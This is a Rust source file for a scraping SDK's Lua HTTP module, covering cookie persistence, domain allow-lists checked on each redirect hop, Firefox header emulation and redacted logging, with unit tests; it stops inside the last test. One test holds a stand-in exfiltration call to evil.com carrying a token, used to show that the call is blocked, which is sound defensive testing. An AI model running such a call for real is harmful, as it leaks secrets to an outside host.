use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use futures::StreamExt as _;
use mlua::{Lua, LuaSerdeExt, Result as LuaResult, Table, Value as LuaValue};
use reqwest::Client;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use serde_json::{Value, json};
use tokio::runtime::Handle;

use super::super::cookies::Cookie;
use super::super::models::RunOptions;
use super::super::reports::{Recorder, redact_url};
use super::super::stop::StopSignal;
use super::cookie_jar::CookieJar;

/// How many redirects one request follows before failing, as `reqwest`'s
/// default policy.
const MAX_REDIRECTS: usize = 10;

/// Builds a fresh cookie jar pre-populated from `cookies` (as previously
/// saved by `cookies::Service` for this scraper), so this run's `fyde.http`
/// client can pick up an already-authenticated session instead of being
/// forced to log in again.
pub(crate) fn build_jar(cookies: &[Cookie]) -> Arc<CookieJar> {
    let jar = CookieJar::default();
    for cookie in cookies {
        jar.add(cookie.set_cookie.as_str(), cookie.origin.as_str());
    }
    Arc::new(jar)
}

/// Exports every unexpired cookie `jar` holds for each URL in
/// `visited_urls` (see `track_url` below), ready to be persisted via
/// `cookies::Service::save`. Querying `matches()` per URL `fyde.http`
/// actually visited means a host-only cookie's host is always known from the
/// origin it was found under, though the cookie itself carries no `Domain`.
/// Querying the visited
/// URLs' paths, not just their origins' `/`, is what keeps a cookie scoped to
/// a narrower `Path` (e.g. Keycloak's `Path=/realms/<realm>/` SSO cookies):
/// `matches()` path-matches like a browser, so it never returns one for `/`.
/// A cookie matched under several URLs of the same origin is exported once.
/// Ported from `demo-rust-fyde`'s `host/session.rs::export_cookies`.
pub(crate) fn export_cookies(
    jar: &CookieJar,
    visited_urls: &Mutex<HashSet<String>>,
) -> Vec<Cookie> {
    let mut urls: Vec<String> = match visited_urls.lock() {
        Ok(urls) => urls.iter().cloned().collect(),
        Err(poisoned) => poisoned.into_inner().iter().cloned().collect(),
    };
    // Deterministic output regardless of the set's iteration order.
    urls.sort();

    let mut seen = HashSet::new();
    let mut cookies = Vec::new();
    for url in urls {
        let Some(origin) = origin_of(&url) else {
            continue;
        };
        for cookie in jar.matches(url.as_str()) {
            let mut set_cookie = format!("{}={}", cookie.name, cookie.value);
            // Only set when the original cookie carried an explicit `Domain`
            // attribute (i.e. it isn't host-only) — reproduced here so
            // `CookieJar::add` restores the same scope on load instead of
            // narrowing a multi-subdomain cookie down to just this origin.
            if let Some(domain) = &cookie.domain {
                set_cookie.push_str(&format!("; Domain={domain}"));
            }
            // Always written, even when it was the default path the setting
            // URL gave it: replayed against the bare origin, a cookie without
            // one would get `/` instead.
            set_cookie.push_str(&format!("; Path={}", cookie.path));
            if cookie.secure {
                set_cookie.push_str("; Secure");
            }
            if seen.insert((origin.clone(), set_cookie.clone())) {
                cookies.push(Cookie {
                    origin: origin.clone(),
                    set_cookie,
                });
            }
        }
    }
    cookies
}

/// Records `url` (`scheme://host[:port]/path`, query and fragment dropped)
/// into the shared set [`export_cookies`] later uses to know which hosts and
/// paths to ask the cookie jar about when exporting cookies for the next run.
fn track_url(urls: &Mutex<HashSet<String>>, url: &str) {
    if let Some(scope) = scope_of(url)
        && let Ok(mut urls) = urls.lock()
    {
        urls.insert(scope);
    }
}

/// A `reqwest` error worded with its causes: its own message alone says
/// only "error following redirect" or "error sending request", while the
/// reason (a redirect outside `allowed_domains`, a refused connection...) is
/// in its sources. `error::lua_code` finds the `reqwest::Error` through
/// [`std::error::Error::source`].
#[derive(Debug)]
struct HttpError(reqwest::Error);

impl std::fmt::Display for HttpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)?;
        let mut source = std::error::Error::source(&self.0);
        while let Some(err) = source {
            write!(f, ": {err}")?;
            source = err.source();
        }
        Ok(())
    }
}

impl std::error::Error for HttpError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        Some(&self.0)
    }
}

/// One redirect a request followed, as `build_client`'s redirect policy
/// saw it.
#[derive(Debug, Clone, PartialEq, Eq)]
struct RedirectHop {
    status: u16,
    from: String,
    to: String,
}

/// Tracks every URL a request's redirect chain (`hops`) went through, and
/// the one it landed on (`final_url`): a hop can set cookies (an OIDC bounce
/// through an identity provider the script never requests itself), which
/// would otherwise be lost with the run.
fn track_redirects(urls: &Mutex<HashSet<String>>, hops: &[RedirectHop], final_url: &str) {
    for hop in hops {
        track_url(urls, &hop.to);
    }
    track_url(urls, final_url);
}

fn origin_of(url: &str) -> Option<String> {
    let scheme_end = url.find("://")?;
    let rest = &url[scheme_end + 3..];
    let host_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    Some(format!("{}://{}", &url[..scheme_end], &rest[..host_end]))
}

/// `url`'s origin and path (`/` when it has none), without query or fragment.
fn scope_of(url: &str) -> Option<String> {
    let origin = origin_of(url)?;
    let rest = &url[origin.len()..];
    let path = &rest[..rest.find(['?', '#']).unwrap_or(rest.len())];
    Some(format!(
        "{origin}{}",
        if path.is_empty() { "/" } else { path }
    ))
}

fn to_header_map(headers: Option<Table>) -> LuaResult<HeaderMap> {
    let mut map = HeaderMap::new();
    if let Some(headers) = headers {
        for pair in headers.pairs::<String, String>() {
            let (key, value) = pair?;
            let name = HeaderName::from_bytes(key.as_bytes()).map_err(mlua::Error::external)?;
            let value = HeaderValue::from_str(&value).map_err(mlua::Error::external)?;
            map.insert(name, value);
        }
    }
    Ok(map)
}

fn table_to_string_map(table: &Table) -> LuaResult<HashMap<String, String>> {
    let mut map = HashMap::new();
    for pair in table.clone().pairs::<String, String>() {
        let (key, value) = pair?;
        map.insert(key, value);
    }
    Ok(map)
}

fn response_to_table(
    lua: &Lua,
    runtime: &Handle,
    stop: &StopSignal,
    resp: reqwest::Response,
) -> LuaResult<Table> {
    let status = resp.status().as_u16();
    // The final URL after following any redirects - scripts need this to
    // know where they actually landed (e.g. to use as a Referer on a later
    // request, mimicking a real browser submitting a form from the page it
    // was just redirected to).
    let url = resp.url().to_string();
    let content_type = resp
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    let body =
        read_body(runtime, stop, resp, super::MAX_BODY_BYTES).map_err(mlua::Error::external)?;
    let body = decode_text(&content_type, &body);

    let out = lua.create_table()?;
    out.set("status", status)?;
    out.set("url", url)?;
    out.set("body", body)?;
    Ok(out)
}

/// Checks `url` against `allowed_domains` (see `host::ensure_domain_allowed`)
/// before any of `get`/`post_form`/`post_json`/`download` sends a single
/// byte on the wire. On a violation, records an `error` entry the same way
/// every other failure in this file does, and returns the `Err` that makes
/// the Lua call itself fail.
fn ensure_domain_allowed_or_record(
    recorder: &Recorder,
    action: &str,
    url: &str,
    allowed_domains: &[String],
) -> LuaResult<()> {
    if let Err(message) = super::ensure_domain_allowed(url, allowed_domains) {
        recorder.record(
            "error",
            json!({ "action": action, "url": redact_url(url), "message": message.clone() }),
        );
        return Err(mlua::Error::RuntimeError(message));
    }
    Ok(())
}

/// Records one `http_redirect` entry per hop a request followed (`hops`, as
/// `build_client`'s redirect policy saw them). Each entry is independent of the
/// final `http_request` entry `get`/`post_form`/`post_json`/`download` also
/// record, so a report shows every intermediate hop (e.g. an OAuth/OIDC
/// bounce) even though the script itself only ever sees the start URL and
/// the final one.
fn record_redirects(recorder: &Recorder, method: &str, hops: &[RedirectHop]) {
    for hop in hops {
        recorder.record(
            "http_redirect",
            json!({
                "method": method,
                "status": hop.status,
                "from": redact_url(&hop.from),
                "to": redact_url(&hop.to),
            }),
        );
    }
}

/// `fyde.http.get/post_form/post_json/download`, ported from
/// `demo-rust-fyde`'s own `host/http.rs` (same cookie jar and redirect
/// handling, on `reqwest`), plus
/// `post_json` (not present in `demo-rust-fyde`): some sites' login/session
/// APIs take a JSON body instead of a form-encoded one (confirmed against a
/// real login HAR capture for `caf/script.lua`), which `post_form`'s
/// hardcoded `.form(&form_map)` can't send — `post_json` takes any Lua
/// value (typically a table), converts it to `serde_json::Value` via
/// `LuaSerdeExt`, and sends it with `reqwest`'s `.json(...)`, which also sets
/// `Content-Type: application/json` unless `headers` overrides it. `runtime`
/// is a handle onto the SDK's ambient tokio runtime — captured by
/// `service.rs` before the Lua VM moves onto its own blocking thread — used
/// to drive `reqwest`'s async calls from these synchronous Lua callbacks,
/// instead of demo-rust-fyde's private, per-run `Runtime`.
///
/// Each call writes an `http_request` (or `error`) entry to `recorder` —
/// method, url, status and timing only by default, never request header
/// values, form/JSON body values, since those routinely carry
/// credentials/session cookies. `options.debug_http_dump` (ported from
/// `demo-rust-fyde`'s own opt-in dump, threaded here from `Service::run`'s
/// `debug_http_dump` parameter) additionally records the *response* body
/// for `get`/`post_form`/`post_json` (never the request side) — enable it
/// only for a trusted, local debugging run.
///
/// `options.browser_emulation` controls whether requests carry a browser's
/// navigation headers ([`browser_headers`], from the `uagent` crate's
/// captures: `User-Agent`, `Accept`, `Accept-Language`, `Sec-Fetch-*`...)
/// rather than `reqwest`'s bare defaults (no `User-Agent` at all). The TLS and
/// HTTP/2 fingerprints stay rustls' and hyper's either way. A scraper can opt out per its
/// `scrapers/<name>/manifest.json`'s `wreq_emulation` field (in the
/// `scripts` repo, named after the client this replaced) rather than
/// carrying a global toggle.
///
/// `options.follow_redirects` controls whether the client follows HTTP
/// redirects at all. Scripts generally rely on a real-browser-like client
/// that follows them (e.g. to pick up cookies set along an OAuth/OIDC
/// redirect chain before a login POST), up to [`MAX_REDIRECTS`] as
/// `reqwest`'s default policy when `true`. A
/// scraper can opt out per its `scrapers/<name>/manifest.json`'s
/// `follow_redirects` field when it needs to inspect a redirect response
/// itself (e.g. reading a `Location` header) rather than carrying a global
/// toggle.
///
/// `options.allowed_domains` gates every method here (see
/// `host::ensure_domain_allowed`): a call whose `url` isn't on one of these
/// domains (or a subdomain of one) fails before the request is ever sent —
/// no DNS lookup, no connection, nothing recorded beyond the `error` entry
/// itself — and that failure propagates as a normal Lua error, stopping the
/// script unless it's wrapped in `pcall`. It also gates every hop of a
/// redirect chain, not just the initial URL: when `follow_redirects` is on,
/// the client's redirect policy itself checks each `Location` target
/// against `allowed_domains` before following it — otherwise a page on an
/// allowed domain could redirect a request straight to a disallowed one and
/// `reqwest` would follow it automatically, bypassing the check above
/// entirely.
pub(super) fn table(
    lua: &Lua,
    jar: Arc<CookieJar>,
    visited_urls: Arc<Mutex<HashSet<String>>>,
    recorder: Arc<Recorder>,
    runtime: Handle,
    stop: StopSignal,
    options: &RunOptions,
) -> LuaResult<Table> {
    let allowed_domains = Arc::new(options.allowed_domains.clone());
    let redirects = Arc::new(Mutex::new(Vec::new()));
    let host = Arc::new(HttpHost {
        client: build_client(
            options,
            jar.clone(),
            allowed_domains.clone(),
            redirects.clone(),
        )?,
        jar,
        redirects,
        visited_urls,
        recorder,
        runtime,
        stop,
        allowed_domains,
        debug_http_dump: options.debug_http_dump,
    });

    let http = lua.create_table()?;

    let get = host.clone();
    http.set(
        "get",
        lua.create_function(move |lua, (url, headers): (String, Option<Table>)| {
            get.admit("http.get", &url)?;
            let headers = to_header_map(headers)?;
            let request = get.client.get(&url).headers(headers);
            get.send_text(lua, "http.get", "GET", &url, request, None)
        })?,
    )?;

    let post_form = host.clone();
    http.set(
        "post_form",
        lua.create_function(
            move |lua, (url, form, headers): (String, Table, Option<Table>)| {
                post_form.admit("http.post_form", &url)?;
                let form_map = table_to_string_map(&form)?;
                let form_fields = form_map.keys().cloned().collect();
                let headers = to_header_map(headers)?;
                let request = post_form.client.post(&url).headers(headers).form(&form_map);
                post_form.send_text(
                    lua,
                    "http.post_form",
                    "POST",
                    &url,
                    request,
                    Some(form_fields),
                )
            },
        )?,
    )?;

    let post_json = host.clone();
    http.set(
        "post_json",
        lua.create_function(
            move |lua, (url, body, headers): (String, LuaValue, Option<Table>)| {
                post_json.admit("http.post_json", &url)?;
                let body_json: Value = lua.from_value(body)?;
                let headers = to_header_map(headers)?;
                let request = post_json
                    .client
                    .post(&url)
                    .headers(headers)
                    .json(&body_json);
                post_json.send_text(lua, "http.post_json", "POST", &url, request, None)
            },
        )?,
    )?;

    // `set_cookie(url, set_cookie)` adds a cookie to this run's jar exactly as
    // if `url` had answered with a `Set-Cookie: <set_cookie>` header, for
    // sites that set a cookie from inline JS (e.g. a `document.cookie = ...`
    // anti-bot challenge) that a plain HTTP client never runs. A manual
    // `Cookie` request header can't stand in for this: `reqwest` skips the jar
    // entirely for a request that already carries one. Records nothing (the
    // value may be a session secret); gated by `allowed_domains` like every
    // other method here so a script can't plant cookies for other hosts.
    let set_cookie = host.clone();
    http.set(
        "set_cookie",
        lua.create_function(move |_, (url, cookie): (String, String)| {
            set_cookie.admit("http.set_cookie", &url)?;
            set_cookie.jar.add(cookie.as_str(), url.as_str());
            Ok(())
        })?,
    )?;

    let download = host;
    http.set(
        "download",
        lua.create_function(move |lua, (url, headers): (String, Option<Table>)| {
            download.admit("http.download", &url)?;
            let headers = to_header_map(headers)?;
            let request = download.client.get(&url).headers(headers);
            let started = Instant::now();
            let (resp, hops) = download.send("http.download", &url, request)?;

            let status = resp.status().as_u16();
            record_redirects(&download.recorder, "DOWNLOAD", &hops);
            track_redirects(&download.visited_urls, &hops, resp.url().as_str());
            let content_type = resp
                .headers()
                .get(reqwest::header::CONTENT_TYPE)
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            let bytes = read_body(
                &download.runtime,
                &download.stop,
                resp,
                super::MAX_BODY_BYTES,
            )
            .map_err(|err| download.record_error("http.download", &url, err))?;

            // The body is never dumped here, even under `debug_http_dump`:
            // downloads are routinely binary (PDFs, images), which wouldn't
            // round-trip as JSON text anyway, unlike `get`/`post_form`'s
            // textual response bodies.
            download.recorder.record(
                "http_request",
                json!({
                    "method": "DOWNLOAD",
                    "url": redact_url(&url),
                    "status": status,
                    "content_type": content_type.clone(),
                    "bytes_len": bytes.len(),
                    "duration_ms": started.elapsed().as_millis(),
                }),
            );

            let out = lua.create_table()?;
            out.set("status", status)?;
            out.set("content_type", content_type)?;
            out.set("body", lua.create_string(&bytes)?)?;
            Ok(out)
        })?,
    )?;

    Ok(http)
}

/// Reads `resp`'s whole body, failing as soon as it grows past `max_bytes`
/// ([`super::MAX_BODY_BYTES`] outside tests; counted after decompression)
/// instead of buffering it all first, or as soon as `stop` is set (a large
/// download is where a stopped run would otherwise linger longest).
fn read_body(
    runtime: &Handle,
    stop: &StopSignal,
    resp: reqwest::Response,
    max_bytes: usize,
) -> std::result::Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    stop.block_on(runtime, async {
        let mut stream = resp.bytes_stream();
        let mut body = Vec::new();
        while let Some(chunk) = stream.next().await {
            let chunk = chunk.map_err(|err| HttpError(err.without_url()))?;
            if body.len() + chunk.len() > max_bytes {
                return Err(
                    crate::Error::from(crate::ErrorKind::ScriptLimitExceeded(format!(
                        "response body is larger than the {max_bytes} byte limit"
                    )))
                    .into(),
                );
            }
            body.extend_from_slice(&chunk);
        }
        Ok(body)
    })?
}

/// Decodes `body` the way `reqwest::Response::text` does: in the `charset` of
/// `content_type` (UTF-8 by default), BOM-sniffed, with malformed sequences
/// replaced.
fn decode_text(content_type: &str, body: &[u8]) -> String {
    let label = content_type
        .split(';')
        .skip(1)
        .find_map(|param| {
            let (name, value) = param.split_once('=')?;
            name.trim()
                .eq_ignore_ascii_case("charset")
                .then(|| value.trim().trim_matches('"'))
        })
        .unwrap_or("utf-8");
    let encoding = encoding_rs::Encoding::for_label(label.as_bytes()).unwrap_or(encoding_rs::UTF_8);
    encoding.decode(body).0.into_owned()
}

/// The browser `fyde.http` presents itself as under `browser_emulation`:
/// Firefox, the one `uagent` profiles without client hints (`sec-ch-ua`)
/// whose claims rustls' TLS fingerprint would contradict, on macOS, the
/// platform `uagent`'s headers were captured on.
const EMULATED_BROWSER: uagent::Browser = uagent::Browser::Firefox;
const EMULATED_PLATFORM: uagent::Platform = uagent::Platform::MacOs;
/// French first: the sites scrapers visit are French, as are their users.
const EMULATED_LANGUAGE: &str = "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7";

/// The default headers of a client under `browser_emulation`: `uagent`'s
/// navigation headers for [`EMULATED_BROWSER`] at its latest captured
/// version. `reqwest` sends a default header only when the request has none
/// of that name, so a script's own headers win.
fn browser_headers() -> LuaResult<HeaderMap> {
    let profile = uagent::Profile::new(EMULATED_BROWSER, EMULATED_PLATFORM)
        .and_then(|profile| profile.with_language(EMULATED_LANGUAGE))
        .map_err(mlua::Error::external)?;
    profile
        .headers()
        .into_iter()
        .map(|header| {
            let name =
                HeaderName::from_bytes(header.name.as_bytes()).map_err(mlua::Error::external)?;
            let value = HeaderValue::from_str(&header.value).map_err(mlua::Error::external)?;
            Ok((name, value))
        })
        .collect()
}

/// Builds this run's `reqwest` client on `jar`, per `options` (see
/// [`table`]'s doc comment for `browser_emulation`/`follow_redirects`),
/// checking every redirect hop against `allowed_domains` and pushing each one
/// it follows onto `redirects` (a run's Lua calls are sequential, so
/// [`HttpHost::send`] takes the hops of the request it just sent).
fn build_client(
    options: &RunOptions,
    jar: Arc<CookieJar>,
    allowed_domains: Arc<Vec<String>>,
    redirects: Arc<Mutex<Vec<RedirectHop>>>,
) -> LuaResult<Client> {
    let mut builder = crate::tools::http::client_builder().cookie_provider(jar);
    if options.browser_emulation {
        builder = builder.default_headers(browser_headers()?);
    }
    let redirect_policy = if options.follow_redirects {
        reqwest::redirect::Policy::custom(move |attempt| {
            let target = attempt.url().to_string();
            if let Err(message) = super::ensure_domain_allowed(&target, &allowed_domains) {
                return attempt.error(message);
            }
            // `previous` starts with the request's own URL, so this allows
            // `MAX_REDIRECTS` hops, as `reqwest`'s default policy does.
            if attempt.previous().len() > MAX_REDIRECTS {
                return attempt.error(format!("more than {MAX_REDIRECTS} redirects"));
            }
            let hop = RedirectHop {
                status: attempt.status().as_u16(),
                from: attempt
                    .previous()
                    .last()
                    .map(ToString::to_string)
                    .unwrap_or_default(),
                to: target,
            };
            redirects
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner())
                .push(hop);
            attempt.follow()
        })
    } else {
        reqwest::redirect::Policy::none()
    };
    builder
        .timeout(Duration::from_secs(30))
        .redirect(redirect_policy)
        .build()
        .map_err(mlua::Error::external)
}

/// The state every `fyde.http` function shares for one run, so each of them
/// captures a single `Arc` of it instead of its own copy of every field.
struct HttpHost {
    client: Client,
    jar: Arc<CookieJar>,
    /// The hops `client`'s redirect policy followed for the request in
    /// flight (see [`build_client`]).
    redirects: Arc<Mutex<Vec<RedirectHop>>>,
    visited_urls: Arc<Mutex<HashSet<String>>>,
    recorder: Arc<Recorder>,
    runtime: Handle,
    stop: StopSignal,
    allowed_domains: Arc<Vec<String>>,
    debug_http_dump: bool,
}

impl HttpHost {
    /// The gate every method passes before touching the network: rejects
    /// (and records) a `url` outside `allowed_domains`, then remembers it
    /// for [`export_cookies`].
    fn admit(&self, action: &str, url: &str) -> LuaResult<()> {
        ensure_domain_allowed_or_record(&self.recorder, action, url, &self.allowed_domains)?;
        track_url(&self.visited_urls, url);
        Ok(())
    }

    /// Sends `request`, recording an `error` entry if it fails; gives up on
    /// it as soon as the run is stopped. Returns the response with the
    /// redirects followed to reach it.
    fn send(
        &self,
        action: &str,
        url: &str,
        request: reqwest::RequestBuilder,
    ) -> LuaResult<(reqwest::Response, Vec<RedirectHop>)> {
        self.take_redirects();
        // `send` inside the future: `reqwest` starts the request's timeout
        // there, which needs the runtime's context.
        let resp = self
            .stop
            .block_on(&self.runtime, async move { request.send().await })?
            // `reqwest` appends the request's full URL to its messages, query
            // string included: the report records a redacted one instead.
            .map_err(|err| self.record_error(action, url, HttpError(err.without_url())))?;
        Ok((resp, self.take_redirects()))
    }

    fn take_redirects(&self) -> Vec<RedirectHop> {
        std::mem::take(
            &mut *self
                .redirects
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner()),
        )
    }

    /// Sends `request` for `get`/`post_form`/`post_json` and returns its
    /// textual response as a `{status, url, body}` table, recording an
    /// `http_request` entry (plus `form_fields`' names when given, and the
    /// response body under `debug_http_dump`) or an `error` entry.
    fn send_text(
        &self,
        lua: &Lua,
        action: &str,
        method: &str,
        url: &str,
        request: reqwest::RequestBuilder,
        form_fields: Option<Vec<String>>,
    ) -> LuaResult<Table> {
        let started = Instant::now();
        let (resp, hops) = self.send(action, url, request)?;
        let status = resp.status().as_u16();
        record_redirects(&self.recorder, method, &hops);
        track_redirects(&self.visited_urls, &hops, resp.url().as_str());
        let out = response_to_table(lua, &self.runtime, &self.stop, resp)?;

        let mut entry = json!({
            "method": method,
            "url": redact_url(url),
            "status": status,
            "duration_ms": started.elapsed().as_millis(),
        });
        if let Value::Object(fields) = &mut entry {
            if let Some(form_fields) = form_fields {
                fields.insert("form_fields".into(), json!(form_fields));
            }
            if self.debug_http_dump {
                let body: String = out.get("body").unwrap_or_default();
                fields.insert("response_body".into(), Value::String(body));
            }
        }
        self.recorder.record("http_request", entry);
        Ok(out)
    }

    /// Records `err` as an `error` entry for `action` on `url` and converts
    /// it into the Lua error that fails the script's call.
    fn record_error(
        &self,
        action: &str,
        url: &str,
        err: impl std::fmt::Display + Into<Box<dyn std::error::Error + Send + Sync>>,
    ) -> mlua::Error {
        self.recorder.record(
            "error",
            json!({ "action": action, "url": redact_url(url), "message": err.to_string() }),
        );
        mlua::Error::external(err)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn runtime() -> tokio::runtime::Runtime {
        tokio::runtime::Runtime::new().unwrap()
    }

    #[test]
    fn get_blocks_a_url_outside_allowed_domains_without_reaching_the_network() {
        let runtime = runtime();
        let lua = Lua::new();
        let recorder = Arc::new(Recorder::new("didaxis"));
        let http_table = table(
            &lua,
            Arc::new(CookieJar::default()),
            Arc::new(Mutex::new(HashSet::new())),
            recorder.clone(),
            runtime.handle().clone(),
            StopSignal::new(),
            &RunOptions {
                debug_http_dump: false,
                browser_emulation: true,
                follow_redirects: true,
                allowed_domains: vec!["allowed.example.com".to_string()],
                browser_visible: false,
            },
        )
        .unwrap();
        lua.globals().set("http", http_table).unwrap();

        let result: LuaResult<Table> = lua
            .load(r#"return http.get("https://evil.com/steal?token=secret")"#)
            .eval();

        let err = result.unwrap_err().to_string();
        assert!(!err.contains("secret"), "{err}");
        let report = recorder.finish();
        assert_eq!(report.entries.len(), 1);
        assert_eq!(report.entries[0].event, "error");
        assert_eq!(
            report.entries[0].value["url"],
            "https://evil.com/steal?[redacted]"
        );
        assert!(!report.entries[0].value.to_string().contains("secret"));
    }

    /// Spawns a tiny local server that unconditionally 302-redirects every
    /// connection to `location`, and returns the `http://127.0.0.1:<port>/`
    /// URL to hit it at. Used to prove the redirect policy itself checks
    /// `allowed_domains` on each hop, not just the request's starting URL —
    /// a real request/response round trip is the only way to exercise
    /// `reqwest`'s own redirect-following machinery.
    fn spawn_redirecting_server(runtime: &tokio::runtime::Runtime, location: &str) -> String {
        let listener = runtime
            .block_on(tokio::net::TcpListener::bind("127.0.0.1:0"))
            .unwrap();
        let addr = listener.local_addr().unwrap();
        let location = location.to_string();

        runtime.spawn(async move {
            loop {
                let Ok((mut socket, _)) = listener.accept().await else {
                    break;
                };
                let location = location.clone();
                tokio::spawn(async move {
                    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
                    let mut buf = [0u8; 1024];
                    let _ = socket.read(&mut buf).await;
                    let response = format!(
                        "HTTP/1.1 302 Found\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                    );
                    let _ = socket.write_all(response.as_bytes()).await;
                    let _ = socket.shutdown().await;
                });
            }
        });

        format!("http://127.0.0.1:{}/", addr.port())
    }

    #[test]
    fn get_blocks_a_redirect_to_a_domain_outside_allowed_domains() {
        let runtime = runtime();
        let url = spawn_redirecting_server(&runtime, "http://evil.example.invalid/");

        let lua = Lua::new();
        let recorder = Arc::new(Recorder::new("didaxis"));
        let http_table = table(
            &lua,
            Arc::new(CookieJar::default()),
            Arc::new(Mutex::new(HashSet::new())),
            recorder.clone(),
            runtime.handle().clone(),
            StopSignal::new(),
            &RunOptions {
                debug_http_dump: false,
                browser_emulation: false,
                follow_redirects: true,
                // Allows the redirecting server's own host, but not the host
                // it redirects to — proving the block happens on the redirect
                // hop, not the (allowed) initial request.
                allowed_domains: vec!["127.0.0.1".to_string()],
                browser_visible: false,
            },
        )
        .unwrap();
        lua.globals().set("http", http_table).unwrap();

        let result: LuaResult<Table> = lua.load(format!(r#"return http.get("{url}")"#)).eval();

        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("evil.example.invalid"),
            "unexpected error: {err}"
        );
    }

    /// Spawns a tiny local server that always responds `200 OK` with
    /// `body`, and returns the `http://127.0.0.1:<port>/` URL to hit it at
    /// — the final hop a redirect inside `allowed_domains` should actually
    /// reach.
    fn spawn_ok_server(runtime: &tokio::runtime::Runtime, body: &str) -> String {
        let listener = runtime
            .block_on(tokio::net::TcpListener::bind("127.0.0.1:0"))
            .unwrap();
        let addr = listener.local_addr().unwrap();
        let body = body.to_string();

        runtime.spawn(async move {
            loop {
                let Ok((mut socket, _)) = listener.accept().await else {
                    break;
                };
                let body = body.clone();
                tokio::spawn(async move {
                    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
                    let mut buf = [0u8; 1024];
                    let _ = socket.read(&mut buf).await;
                    let response = format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = socket.write_all(response.as_bytes()).await;
                    let _ = socket.shutdown().await;
                });
            }
        });

        format!("http://127.0.0.1:{}/", addr.port())
    }

    #[test]
    fn read_body_returns_a_body_within_the_limit() {
        let runtime = runtime();
        let url = spawn_ok_server(&runtime, "hello");
        let resp = runtime
            .block_on(
                crate::tools::http::client_builder()
                    .build()
                    .unwrap()
                    .get(&url)
                    .send(),
            )
            .unwrap();

        let body = read_body(runtime.handle(), &StopSignal::new(), resp, 5).unwrap();

        assert_eq!(body, b"hello");
    }

    #[test]
    fn read_body_fails_on_a_body_over_the_limit() {
        let runtime = runtime();
        let url = spawn_ok_server(&runtime, "hello");
        let resp = runtime
            .block_on(
                crate::tools::http::client_builder()
                    .build()
                    .unwrap()
                    .get(&url)
                    .send(),
            )
            .unwrap();

        let err = read_body(runtime.handle(), &StopSignal::new(), resp, 4).unwrap_err();

        assert!(err.to_string().contains("4 byte limit"), "{err}");
        let err = err.downcast_ref::<crate::Error>().expect("a crate error");
        assert_eq!(err.code(), crate::ErrorCode::ScriptLimitExceeded);
    }

    #[test]
    fn decode_text_uses_the_content_types_charset() {
        assert_eq!(
            decode_text("text/html; charset=ISO-8859-1", b"caf\xe9"),
            "café"
        );
        assert_eq!(
            decode_text("text/html; Charset=\"utf-8\"", "café".as_bytes()),
            "café"
        );
    }

    #[test]
    fn decode_text_defaults_to_utf8() {
        assert_eq!(decode_text("text/html", "café".as_bytes()), "café");
        assert_eq!(decode_text("", b"caf\xe9"), "caf\u{fffd}");
    }

    #[test]
    fn get_follows_a_redirect_to_a_domain_inside_allowed_domains() {
        let runtime = runtime();
        let target_url = spawn_ok_server(&runtime, "hello");
        let redirect_url = spawn_redirecting_server(&runtime, &target_url);

        let lua = Lua::new();
        let recorder = Arc::new(Recorder::new("didaxis"));
        let http_table = table(
            &lua,
            Arc::new(CookieJar::default()),
            Arc::new(Mutex::new(HashSet::new())),
            recorder.clone(),
            runtime.handle().clone(),
            StopSignal::new(),
            &RunOptions {
                debug_http_dump: false,
                browser_emulation: false,
                follow_redirects: true,
                // Both servers are on 127.0.0.1 (just different ports, which
                // the domain check ignores) — proving an allowed redirect still
                // gets followed, not just that a disallowed one gets blocked.
                allowed_domains: vec!["127.0.0.1".to_string()],
                browser_visible: false,
            },
        )
        .unwrap();
        lua.globals().set("http", http_table).unwrap();

        let result: Table = lua
            .load(format!(r#"return http.get("{redirect_url}")"#))
            .eval()
            .unwrap();

        assert_eq!(result.get::<u16>("status").unwrap(), 200);
        assert_eq!(result.get::<String>("body").unwrap(), "hello");
        assert_eq!(result.get::<String>("url").unwrap(), target_url);
        let report = recorder.finish();
        let redirect = report
            .entries
            .iter()
            .find(|entry| entry.event == "http_redirect")
            .expect("the hop is recorded");
        assert_eq!(redirect.value["status"], 302);
        assert_eq!(redirect.value["from"], redirect_url.as_str());
        assert_eq!(redirect.value["to"], target_url.as_str());
    }

    #[test]
    fn get_fails_on_a_refused_connection_as_site_unreachable() {
        let runtime = runtime();
        // Bound then dropped: nothing listens on the port any more.
        let port = std::net::TcpListener::bind("127.0.0.1:0")
            .unwrap()
            .local_addr()
            .unwrap()
            .port();
        let lua = Lua::new();
        let recorder = Arc::new(Recorder::new("didaxis"));
        let http_table = table(
            &lua,
            Arc::new(CookieJar::default()),
            Arc::new(Mutex::new(HashSet::new())),
            recorder.clone(),
            runtime.handle().clone(),
            StopSignal::new(),
            &RunOptions {
                debug_http_dump: false,
                browser_emulation: true,
                follow_redirects: true,
                allowed_domains: vec!["127.0.0.1".to_string()],
                browser_visible: false,
            },
        )
        .unwrap();
        lua.globals().set("http", http_table).unwrap();

        let err = lua
            .load(format!(
                r#"return http.get("http://127.0.0.1:{port}/?token=secret")"#
            ))
            .eval::<Table>()
            .unwrap_err();

        assert_eq!(
            crate::Error::from(err).code(),
            crate::ErrorCode::ScraperSiteUnreachable
        );
        let report = recorder.finish();
        let message = report.entries[0].value["message"].as_str().unwrap();
        // The cause, not just "error sending request", and no query string.
        assert!(message.contains("onnect"), "{message}");
        assert!(!message.contains("secret"), "{message}");
    }

    #[test]
    fn browser_headers_are_uagents_firefox_in_french() {
        let headers = browser_headers().unwrap();

